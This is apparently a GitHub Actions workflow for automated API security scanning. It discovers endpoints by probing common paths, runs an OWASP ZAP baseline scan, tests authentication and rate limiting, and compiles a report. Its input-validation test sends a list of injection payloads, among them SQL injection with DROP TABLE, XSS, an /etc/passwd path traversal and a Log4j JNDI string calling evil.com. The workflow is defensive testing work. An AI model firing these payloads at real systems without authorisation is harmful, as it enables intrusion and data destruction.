name: API Security Scan

on:
  push:
    branches: [ "main", "master", "develop" ]
    paths-ignore:
      - '**.md'
      - 'docs/**'
      - '.github/workflows/security-scan.yml'  # Avoid triggering on main security workflow changes
  pull_request:
    branches: [ "main", "master" ]
  schedule:
    - cron: '0 3 * * 1'  # Weekly on Monday at 3 AM
  workflow_dispatch:
    inputs:
      target_url:
        description: 'Custom API target URL to scan'
        required: false
        default: ''
      scan_intensity:
        description: 'Scan intensity level'
        required: false
        default: 'medium'
        type: choice
        options:
        - light
        - medium
        - intensive

permissions:
  contents: read
  security-events: write
  actions: read
  pull-requests: write
  issues: write

env:
  # API Security Configuration with repository variables and defaults
  API_BASE_URL: ${{ vars.API_BASE_URL || 'https://restful-booker.herokuapp.com' }}
  SCAN_INTENSITY: ${{ vars.SCAN_INTENSITY || 'medium' }}

  # Security thresholds for API scanning - define once
  API_CRITICAL_THRESHOLD: ${{ vars.API_CRITICAL_THRESHOLD || '0' }}
  API_HIGH_THRESHOLD: ${{ vars.API_HIGH_THRESHOLD || '3' }}
  API_MEDIUM_THRESHOLD: ${{ vars.API_MEDIUM_THRESHOLD || '10' }}

jobs:

  api_endpoint_discovery:
    name: 🔍 API Endpoint Discovery
    runs-on: ubuntu-latest
    outputs:
      endpoints_found: ${{ steps.discovery.outputs.endpoints_count }}
      scan_target: ${{ steps.validate.outputs.target }}
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'

      - name: Validate scan target
        id: validate
        run: |
          TARGET="${{ env.API_BASE_URL }}"
          
          if [[ "$TARGET" == *"example.com"* ]] || [[ -z "$TARGET" ]]; then
            echo "⚠️ Using demo API for testing: https://petstore.swagger.io/v2"
            TARGET="https://petstore.swagger.io/v2"
          fi
          
          echo "target=$TARGET" >> $GITHUB_OUTPUT
          echo "🎯 API Security scan target: $TARGET"

      - name: Install discovery tools
        run: |
          pip install requests beautifulsoup4 urllib3
          mkdir -p reports/api-discovery

      - name: Advanced API endpoint discovery
        id: discovery
        run: |
          echo "🔍 Starting comprehensive API endpoint discovery..."
          
          cat > api_discovery.py << 'EOF'
          import requests
          import json
          import re
          from urllib.parse import urljoin, urlparse
          import sys
          import time

          def discover_api_endpoints(base_url, intensity='medium'):
              endpoints = []
              
              # Intensity-based scanning patterns
              if intensity == 'light':
                  api_patterns = ['/api', '/api/v1', '/health', '/status']
                  max_additional_paths = 5
              elif intensity == 'intensive':
                  api_patterns = [
                      # Version patterns
                      '/api/v1', '/api/v2', '/api/v3', '/api/v4', '/v1', '/v2', '/v3', '/v4',
                      '/rest/v1', '/rest/v2', '/graphql', '/api', '/rest',
                      # Common endpoints
                      '/users', '/user', '/auth', '/login', '/register', '/signup',
                      '/admin', '/dashboard', '/config', '/settings', '/profile',
                      '/health', '/status', '/metrics', '/info', '/ping', '/version',
                      # Resource patterns
                      '/products', '/orders', '/customers', '/payments', '/billing',
                      '/files', '/uploads', '/downloads', '/search', '/data',
                      # Development/Debug endpoints
                      '/debug', '/test', '/dev', '/staging', '/internal',
                      '/docs', '/documentation', '/help', '/swagger', '/openapi',
                      # Security-sensitive
                      '/tokens', '/keys', '/secrets', '/certificates', '/backup'
                  ]
                  max_additional_paths = 20
              else:  # medium
                  api_patterns = [
                      '/api/v1', '/api/v2', '/v1', '/v2', '/rest/v1', '/graphql', '/api',
                      '/users', '/user', '/auth', '/login', '/admin', '/config',
                      '/health', '/status', '/metrics', '/info', '/products',
                      '/debug', '/docs', '/swagger', '/openapi'
                  ]
                  max_additional_paths = 10
              
              print(f"🎯 Running {intensity} intensity scan with {len(api_patterns)} patterns")
              
              # Try different combinations
              for pattern in api_patterns:
                  try:
                      url = urljoin(base_url, pattern)
                      response = requests.get(url, timeout=10, verify=False, 
                                            headers={'User-Agent': 'API-Security-Scanner/1.0'})
                      
                      endpoint_info = {
                          'url': url,
                          'status_code': response.status_code,
                          'content_type': response.headers.get('content-type', ''),
                          'size': len(response.content),
                          'server': response.headers.get('server', ''),
                          'response_time': response.elapsed.total_seconds(),
                          'security_headers': {
                              'cors': response.headers.get('access-control-allow-origin', ''),
                              'csp': response.headers.get('content-security-policy', ''),
                              'hsts': response.headers.get('strict-transport-security', ''),
                              'x_frame_options': response.headers.get('x-frame-options', '')
                          }
                      }
                      
                      # Check if this looks like an API endpoint
                      is_api_endpoint = (
                          response.status_code in [200, 401, 403, 405, 422, 429] or 
                          'json' in response.headers.get('content-type', '') or
                          'api' in response.headers.get('server', '').lower() or
                          pattern in ['/api', '/graphql'] or
                          any(keyword in response.text.lower()[:1000] for keyword in ['json', 'api', 'endpoint'])
                      )
                      
                      if is_api_endpoint:
                          endpoints.append(endpoint_info)
                          print(f"  ✅ Found: {url} [{response.status_code}]")
                          
                          # Look for additional endpoints in response
                          if response.status_code == 200 and len(endpoints) < 50:
                              content = response.text[:5000]  # First 5KB
                              # Find API paths in content
                              api_paths = re.findall(r'["\'/]((?:api|v\d+)/[a-zA-Z0-9/_-]+)["\']', content)
                              for path_match in api_paths[:max_additional_paths]:
                                  try:
                                      additional_url = urljoin(base_url, '/' + path_match)
                                      if additional_url not in [ep['url'] for ep in endpoints]:
                                          add_response = requests.get(additional_url, timeout=5, verify=False)
                                          if add_response.status_code in [200, 401, 403, 405]:
                                              endpoints.append({
                                                  'url': additional_url,
                                                  'status_code': add_response.status_code,
                                                  'content_type': add_response.headers.get('content-type', ''),
                                                  'size': len(add_response.content),
                                                  'discovered_from': url,
                                                  'discovery_method': 'content_analysis'
                                              })
                                              print(f"  🔗 Discovered: {additional_url} [{add_response.status_code}]")
                                  except:
                                      continue
                      
                  except Exception as e:
                      continue
                      
                  time.sleep(0.1)  # Rate limiting
              
              return endpoints

          if __name__ == "__main__":
              base_url = sys.argv[1] if len(sys.argv) > 1 else "https://petstore.swagger.io/v2"
              intensity = sys.argv[2] if len(sys.argv) > 2 else "medium"
              
              print(f"🚀 Starting API discovery for: {base_url}")
              endpoints = discover_api_endpoints(base_url, intensity)
              
              # Categorize endpoints
              accessible_endpoints = [ep for ep in endpoints if ep['status_code'] == 200]
              protected_endpoints = [ep for ep in endpoints if ep['status_code'] in [401, 403]]
              
              # Save results
              discovery_report = {
                  'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                  'target': base_url,
                  'scan_intensity': intensity,
                  'total_endpoints': len(endpoints),
                  'accessible_endpoints': len(accessible_endpoints),
                  'protected_endpoints': len(protected_endpoints),
                  'endpoints': endpoints,
                  'summary': {
                      'api_surface_area': len(endpoints),
                      'security_posture': 'good' if len(protected_endpoints) > len(accessible_endpoints) else 'needs_review'
                  }
              }
              
              with open('reports/api-discovery/discovery-report.json', 'w') as f:
                  json.dump(discovery_report, f, indent=2)
              
              print(f"\n🎯 Discovery Summary:")
              print(f"   Total endpoints found: {len(endpoints)}")
              print(f"   Accessible (200): {len(accessible_endpoints)}")
              print(f"   Protected (401/403): {len(protected_endpoints)}")
              print(f"   Security posture: {discovery_report['summary']['security_posture']}")
              
              return len(endpoints)
          EOF
          
          endpoint_count=$(python api_discovery.py "${{ steps.validate.outputs.target }}" "${{ env.SCAN_INTENSITY }}")
          echo "endpoints_count=$endpoint_count" >> $GITHUB_OUTPUT

      - name: Upload discovery artifacts
        uses: actions/upload-artifact@v4
        with:
          name: api-discovery-report
          path: reports/api-discovery/
          retention-days: ${{ env.REPORT_RETENTION_DAYS }}

  api_security_testing:
    name: 🛡️ API Security Testing
    runs-on: ubuntu-latest
    needs: api_endpoint_discovery
    if: needs.api_endpoint_discovery.outputs.endpoints_found > 0
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Download discovery results
        uses: actions/download-artifact@v4
        with:
          name: api-discovery-report
          path: reports/api-discovery/

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'

      - name: Install security testing tools
        run: |
          pip install requests urllib3 python-nmap
          mkdir -p reports/api-security

      - name: OWASP ZAP API security scan
        run: |
          TARGET="${{ needs.api_endpoint_discovery.outputs.scan_target }}"
          echo "🔍 Running OWASP ZAP scan on: $TARGET"
          
          # Run ZAP baseline scan with API focus
          docker run --rm \
            -v $(pwd)/reports/api-security:/zap/reports:rw \
            owasp/zap2docker-stable \
            zap-baseline.py \
            -t "$TARGET" \
            -J /zap/reports/zap-api-report.json \
            -w /zap/reports/zap-api-report.md \
            -r /zap/reports/zap-api-report.html \
            -d || echo "⚠️ ZAP scan completed with findings"

      - name: Comprehensive API security testing
        run: |
          echo "🔍 Running comprehensive API security tests..."
          
          cat > api_security_tests.py << 'EOF'
          import requests
          import json
          import time
          import threading
          from urllib.parse import urljoin
          import sys

          def load_discovered_endpoints():
              try:
                  with open('reports/api-discovery/discovery-report.json', 'r') as f:
                      data = json.load(f)
                      return data.get('endpoints', [])
              except:
                  return []

          def test_authentication_security(endpoints):
              """Comprehensive authentication and authorization testing"""
              results = []
              
              # Test scenarios
              test_headers = [
                  {},  # No auth
                  {'Authorization': 'Bearer invalid_token_12345'},
                  {'Authorization': 'Basic invalid_base64'},
                  {'X-API-Key': 'invalid_key_12345'},
                  {'Cookie': 'session=invalid_session_12345'}
              ]
              
              for endpoint in endpoints[:15]:  # Test first 15 endpoints
                  url = endpoint['url']
                  
                  for i, headers in enumerate(test_headers):
                      try:
                          response = requests.get(url, headers=headers, timeout=5, verify=False)
                          
                          if response.status_code == 200 and i > 0:  # Should not be accessible with invalid auth
                              results.append({
                                  'test': 'Authentication Bypass',
                                  'severity': 'high',
                                  'url': url,
                                  'finding': f'Endpoint accessible with invalid authentication method {i}',
                                  'status_code': response.status_code,
                                  'auth_method': list(headers.keys())[0] if headers else 'none'
                              })
                          elif response.status_code == 200 and i == 0:  # No auth required
                              results.append({
                                  'test': 'Missing Authentication',
                                  'severity': 'medium',
                                  'url': url,
                                  'finding': 'Endpoint accessible without authentication',
                                  'status_code': response.status_code
                              })
                              
                      except:
                          continue
                          
              return results

          def test_http_security(base_url, endpoints):
              """Test HTTP security configurations"""
              results = []
              
              # Test dangerous HTTP methods
              dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'OPTIONS']
              
              for method in dangerous_methods:
                  try:
                      response = requests.request(method, base_url, timeout=5, verify=False)
                      if response.status_code not in [405, 501, 404]:
                          severity = 'high' if method in ['PUT', 'DELETE'] else 'medium'
                          results.append({
                              'test': 'HTTP Methods',
                              'severity': severity,
                              'url': base_url,
                              'finding': f'{method} method is allowed',
                              'status_code': response.status_code,
                              'method': method
                          })
                  except:
                      continue
              
              # Test security headers
              try:
                  response = requests.get(base_url, timeout=5, verify=False)
                  headers = response.headers
                  
                  security_headers = {
                      'Strict-Transport-Security': 'Missing HSTS header',
                      'Content-Security-Policy': 'Missing CSP header',
                      'X-Frame-Options': 'Missing X-Frame-Options header',
                      'X-Content-Type-Options': 'Missing X-Content-Type-Options header'
                  }
                  
                  for header, description in security_headers.items():
                      if header not in headers:
                          results.append({
                              'test': 'Security Headers',
                              'severity': 'low',
                              'url': base_url,
                              'finding': description,
                              'header': header
                          })
              except:
                  pass
                  
              return results

          def test_rate_limiting(base_url):
              """Test rate limiting implementation"""
              results = []
              
              try:
                  # Send rapid requests
                  responses = []
                  start_time = time.time()
                  
                  for i in range(25):  # Increased from 20 to 25
                      response = requests.get(base_url, timeout=2, verify=False)
                      responses.append({
                          'status_code': response.status_code,
                          'timestamp': time.time() - start_time
                      })
                      if i < 24:  # Don't sleep after last request
                          time.sleep(0.05)  # Faster requests
                  
                  # Analyze responses
                  success_count = sum(1 for r in responses if r['status_code'] == 200)
                  rate_limited = any(r['status_code'] in [429, 503] for r in responses)
                  
                  if success_count >= 20 and not rate_limited:
                      results.append({
                          'test': 'Rate Limiting',
                          'severity': 'medium',
                          'url': base_url,
                          'finding': 'No rate limiting detected',
                          'details': f'{success_count}/25 requests succeeded without rate limiting'
                      })
                  elif rate_limited:
                      results.append({
                          'test': 'Rate Limiting',
                          'severity': 'info',
                          'url': base_url,
                          'finding': 'Rate limiting properly implemented',
                          'details': f'Rate limiting triggered after {success_count} requests'
                      })
                      
              except:
                  pass
                  
              return results

          def test_input_validation(endpoints):
              """Test input validation and injection vulnerabilities"""
              results = []
              
              # Common injection payloads
              payloads = [
                  ("' OR '1'='1", "SQL Injection"),
                  ("<script>alert('xss')</script>", "XSS"),
                  ("../../../../etc/passwd", "Path Traversal"),
                  ("${jndi:ldap://evil.com/a}", "Log4j Injection"),
                  ("{{7*7}}", "Template Injection"),
                  ("'; DROP TABLE users; --", "SQL Injection")
              ]
              
              for endpoint in endpoints[:8]:  # Test first 8 endpoints
                  url = endpoint['url']
                  
                  for payload, attack_type in payloads:
                      try:
                          # Test as query parameter
                          test_url = f"{url}?test={payload}"
                          response = requests.get(test_url, timeout=5, verify=False)
                          
                          # Simple detection based on response
                          if (payload in response.text or 
                              response.status_code == 500 or
                              'error' in response.text.lower()[:1000]):
                              results.append({
                                  'test': 'Input Validation',
                                  'severity': 'high',
                                  'url': test_url,
                                  'finding': f'Potential {attack_type} vulnerability',
                                  'payload': payload,
                                  'status_code': response.status_code
                              })
                          
                          # Test as path parameter if URL has parameters
                          if '/' in url.split('?')[0][-10:]:  # Simple check for path parameters
                              path_test_url = url.replace(url.split('/')[-1], payload)
                              try:
                                  response = requests.get(path_test_url, timeout=3, verify=False)
                                  if response.status_code == 500:
                                      results.append({
                                          'test': 'Path Parameter Injection',
                                          'severity': 'medium',
                                          'url': path_test_url,
                                          'finding': f'Path parameter may be vulnerable to {attack_type}',
                                          'payload': payload,
                                          'status_code': response.status_code
                                      })
                              except:
                                  pass
                                  
                      except:
                          continue
                          
              return results

          def test_information_disclosure(endpoints):
              """Test for information disclosure vulnerabilities"""
              results = []
              
              sensitive_patterns = [
                  ('password', 'Password in response'),
                  ('secret', 'Secret in response'),
                  ('key', 'API key in response'),
                  ('token', 'Token in response'),
                  ('database', 'Database information'),
                  ('config', 'Configuration data'),
                  ('admin', 'Admin information'),
                  ('debug', 'Debug information'),
                  ('stack trace', 'Stack trace exposed'),
                  ('exception', 'Exception details exposed')
              ]
              
              for endpoint in endpoints[:12]:  # Test first 12 endpoints
                  try:
                      response = requests.get(endpoint['url'], timeout=5, verify=False)
                      if response.status_code == 200:
                          content_lower = response.text.lower()
                          
                          for pattern, description in sensitive_patterns:
                              if pattern in content_lower:
                                  results.append({
                                      'test': 'Information Disclosure',
                                      'severity': 'medium' if pattern in ['password', 'secret', 'key', 'token'] else 'low',
                                      'url': endpoint['url'],
                                      'finding': description,
                                      'pattern': pattern
                                  })
                                  break  # One finding per endpoint
                  except:
                      continue
                      
              return results

          def main():
              target_url = sys.argv[1] if len(sys.argv) > 1 else "https://petstore.swagger.io/v2"
              endpoints = load_discovered_endpoints()
              
              if not endpoints:
                  print("❌ No endpoints loaded from discovery phase")
                  return 1
              
              print(f"🔍 Running security tests on {len(endpoints)} discovered endpoints...")
              
              all_results = []
              
              # Run all security tests
              print("  🔐 Testing authentication security...")
              all_results.extend(test_authentication_security(endpoints))
              
              print("  🌐 Testing HTTP security...")
              all_results.extend(test_http_security(target_url, endpoints))
              
              print("  ⏱️ Testing rate limiting...")
              all_results.extend(test_rate_limiting(target_url))
              
              print("  🛡️ Testing input validation...")
              all_results.extend(test_input_validation(endpoints))
              
              print("  📄 Testing information disclosure...")
              all_results.extend(test_information_disclosure(endpoints))
              
              # Generate comprehensive security report
              security_report = {
                  'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                  'target': target_url,
                  'endpoints_tested': len(endpoints),
                  'total_findings': len(all_results),
                  'findings': all_results,
                  'summary': {
                      'critical': len([r for r in all_results if r.get('severity') == 'critical']),
                      'high': len([r for r in all_results if r.get('severity') == 'high']),
                      'medium': len([r for r in all_results if r.get('severity') == 'medium']),
                      'low': len([r for r in all_results if r.get('severity') == 'low']),
                      'info': len([r for r in all_results if r.get('severity') == 'info'])
                  },
                  'test_coverage': {
                      'authentication_tests': len([r for r in all_results if 'Authentication' in r.get('test', '')]),
                      'http_security_tests': len([r for r in all_results if 'HTTP' in r.get('test', '')]),
                      'input_validation_tests': len([r for r in all_results if 'Input' in r.get('test', '')]),
                      'information_disclosure_tests': len([r for r in all_results if 'Information' in r.get('test', '')]),
                      'rate_limiting_tests': len([r for r in all_results if 'Rate' in r.get('test', '')])
                  }
              }
              
              # Save results
              with open('reports/api-security/security-test-results.json', 'w') as f:
                  json.dump(security_report, f, indent=2)
              
              # Print detailed summary
              print(f"\n🎯 API Security Testing Summary:")
              print(f"   Target: {target_url}")
              print(f"   Endpoints tested: {len(endpoints)}")
              print(f"   Total findings: {security_report['total_findings']}")
              print(f"   Critical: {security_report['summary']['critical']}")
              print(f"   High: {security_report['summary']['high']}")
              print(f"   Medium: {security_report['summary']['medium']}")
              print(f"   Low: {security_report['summary']['low']}")
              print(f"   Info: {security_report['summary']['info']}")
              
              # Return appropriate exit code
              if security_report['summary']['critical'] > 0:
                  print("🚨 Critical vulnerabilities found!")
                  return 1
              elif security_report['summary']['high'] > int("${{ env.API_HIGH_THRESHOLD }}"):
                  print("⚠️ High severity vulnerabilities exceed threshold!")
                  return 1
              
              return 0

          if __name__ == "__main__":
              exit(main())
          EOF
          
          python api_security_tests.py "${{ needs.api_endpoint_discovery.outputs.scan_target }}"

      - name: Upload security test artifacts
        uses: actions/upload-artifact@v4
        with:
          name: api-security-test-results
          path: reports/api-security/
          retention-days: ${{ env.REPORT_RETENTION_DAYS }}

  api_security_reporting:
    name: 📊 API Security Report
    runs-on: ubuntu-latest
    needs: [api_endpoint_discovery, api_security_testing]
    if: always()
    
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: reports
        continue-on-error: true

      - name: Generate comprehensive API security report
        run: |
          echo "📊 Generating comprehensive API security report..."
          
          cat > generate_report.py << 'EOF'
          import json
          import os
          from datetime import datetime

          def load_json_file(filepath):
              try:
                  with open(filepath, 'r') as f:
                      return json.load(f)
              except Exception as e:
                  print(f"Warning: Could not load {filepath}: {e}")
                  return {}

          # Load all results
          discovery_report = load_json_file('reports/api-discovery-report/discovery-report.json')
          security_results = load_json_file('reports/api-security-test-results/security-test-results.json')

          # Generate comprehensive summary
          total_endpoints = discovery_report.get('total_endpoints', 0)
          accessible_endpoints = discovery_report.get('accessible_endpoints', 0)
          protected_endpoints = discovery_report.get('protected_endpoints', 0)

          findings_summary = security_results.get('summary', {})
          total_findings = security_results.get('total_findings', 0)
          test_coverage = security_results.get('test_coverage', {})

          # Calculate security score
          max_score = 100
          critical_penalty = findings_summary.get('critical', 0) * 25
          high_penalty = findings_summary.get('high', 0) * 10
          medium_penalty = findings_summary.get('medium', 0) * 3
          
          security_score = max(0, max_score - critical_penalty - high_penalty - medium_penalty)

          # Determine risk level
          if findings_summary.get('critical', 0) > 0:
              risk_level, risk_emoji = "CRITICAL", "🚨"
          elif findings_summary.get('high', 0) > 3:
              risk_level, risk_emoji = "HIGH", "⚠️"
          elif findings_summary.get('high', 0) > 0 or findings_summary.get('medium', 0) > 5:
              risk_level, risk_emoji = "MEDIUM", "🟡"
          else:
              risk_level, risk_emoji = "LOW", "✅"

          # Create markdown report
          report_content = f"""# 🔒 API Security Scan Report

          ## {risk_emoji} Overall Risk Level: {risk_level}

          **Security Score: {security_score}/100**

          ## 📊 Scan Summary
          - **Target:** {security_results.get('target', 'N/A')}
          - **Scan Date:** {security_results.get('timestamp', 'N/A')}
          - **Endpoints Discovered:** {total_endpoints}
          - **Endpoints Tested:** {security_results.get('endpoints_tested', 0)}

          ## 🎯 Endpoint Discovery Results
          - **Total API Endpoints:** {total_endpoints}
          - **Accessible (200):** {accessible_endpoints}
          - **Protected (401/403):** {protected_endpoints}
          - **Security Posture:** {discovery_report.get('summary', {}).get('security_posture', 'Unknown')}

          ## 🛡️ Security Findings
          - **Critical:** {findings_summary.get('critical', 0)}
          - **High:** {findings_summary.get('high', 0)}
          - **Medium:** {findings_summary.get('medium', 0)}
          - **Low:** {findings_summary.get('low', 0)}
          - **Info:** {findings_summary.get('info', 0)}

          ## 🧪 Test Coverage
          - **Authentication Tests:** {test_coverage.get('authentication_tests', 0)}
          - **HTTP Security Tests:** {test_coverage.get('http_security_tests', 0)}
          - **Input Validation Tests:** {test_coverage.get('input_validation_tests', 0)}
          - **Information Disclosure Tests:** {test_coverage.get('information_disclosure_tests', 0)}
          - **Rate Limiting Tests:** {test_coverage.get('rate_limiting_tests', 0)}

          ## 🎯 Recommendations

          """

          # Add specific recommendations based on findings
          if findings_summary.get('critical', 0) > 0:
              report_content += "### 🚨 IMMEDIATE ACTION REQUIRED\n"
              report_content += "- **Critical vulnerabilities detected** - Address immediately\n"
              report_content += "- Implement emergency security patches\n"
              report_content += "- Consider taking vulnerable endpoints offline until fixed\n\n"
          
          if findings_summary.get('high', 0) > 0:
              report_content += "### ⚠️ HIGH PRIORITY\n"
              report_content += "- Review and fix high-severity vulnerabilities within 48-72 hours\n"
              report_content += "- Implement additional authentication and authorization controls\n"
              report_content += "- Enhance input validation and sanitization\n\n"

          if accessible_endpoints > protected_endpoints:
              report_content += "### 🔐 AUTHENTICATION IMPROVEMENT\n"
              report_content += "- Too many endpoints are accessible without authentication\n"
              report_content += "- Implement proper authentication mechanisms\n"
              report_content += "- Review and restrict endpoint access based on user roles\n\n"

          if test_coverage.get('rate_limiting_tests', 0) > 0 and 'Rate' in str(security_results.get('findings', [])):
              report_content += "### ⏱️ RATE LIMITING\n"
              report_content += "- Implement rate limiting to prevent abuse\n"
              report_content += "- Configure appropriate request thresholds\n"
              report_content += "- Add monitoring for unusual traffic patterns\n\n"

          report_content += f"""
          ## 📈 Next Steps
          1. **Prioritize Critical/High findings** - Address these vulnerabilities first
          2. **Implement security headers** - Add missing security headers to all endpoints
          3. **Enhance authentication** - Strengthen authentication and authorization mechanisms
          4. **Regular scanning** - Schedule regular API security scans
          5. **Security training** - Ensure development team follows secure coding practices

          ---
          **Report generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC
          **Scan intensity:** {os.environ.get('SCAN_INTENSITY', 'medium')}
          """

          # Save report
          os.makedirs('reports/final', exist_ok=True)
          with open('reports/final/api-security-report.md', 'w') as f:
              f.write(report_content)

          # Save JSON summary for programmatic access
          summary = {
              'scan_summary': {
                  'timestamp': security_results.get('timestamp', ''),
                  'target': security_results.get('target', ''),
                  'risk_level': risk_level,
                  'security_score': security_score,
                  'total_endpoints': total_endpoints,
                  'total_findings': total_findings,
                  'findings_by_severity': findings_summary,
                  'test_coverage': test_coverage
              }
          }

          with open('reports/final/api-security-summary.json', 'w') as f:
              json.dump(summary, f, indent=2)

          print("✅ API Security Report generated successfully")
          print(f"Risk Level: {risk_level}")
          print(f"Security Score: {security_score}/100")
          print(f"Total Findings: {total_findings}")
          EOF

          python generate_report.py

      - name: Create workflow summary
        run: |
          if [ -f reports/final/api-security-report.md ]; then
            echo "## 🔒 API Security Scan Results" >> $GITHUB_STEP_SUMMARY
            cat reports/final/api-security-report.md >> $GITHUB_STEP_SUMMARY
          else
            echo "⚠️ API Security report could not be generated" >> $GITHUB_STEP_SUMMARY
          fi

      - name: Post PR comment with security report
        if: github.event_name == 'pull_request'
        uses: marocchino/sticky-pull-request-comment@v2
        with:
          path: reports/final/api-security-report.md
          header: api-security-report

      - name: Upload final report
        uses: actions/upload-artifact@v4
        with:
          name: api-security-final-report
          path: reports/final/
          retention-days: ${{ env.REPORT_RETENTION_DAYS }}

      - name: Check security thresholds and fail if needed
        run: |
          if [ -f reports/final/api-security-summary.json ]; then
            critical=$(jq '.scan_summary.findings_by_severity.critical // 0' reports/final/api-security-summary.json)
            high=$(jq '.scan_summary.findings_by_severity.high // 0' reports/final/api-security-summary.json)
            
            echo "Security threshold check:"
            echo "  Critical findings: $critical (threshold: ${{ env.API_CRITICAL_THRESHOLD }})"
            echo "  High findings: $high (threshold: ${{ env.API_HIGH_THRESHOLD }})"
            
            if [ "$critical" -gt "${{ env.API_CRITICAL_THRESHOLD }}" ]; then
              echo "🚨 FAILURE: Critical vulnerabilities exceed threshold!"
              exit 1
            elif [ "$high" -gt "${{ env.API_HIGH_THRESHOLD }}" ]; then
              echo "⚠️ FAILURE: High severity vulnerabilities exceed threshold!"
              exit 1
            else
              echo "✅ Security thresholds passed"
            fi
          fi
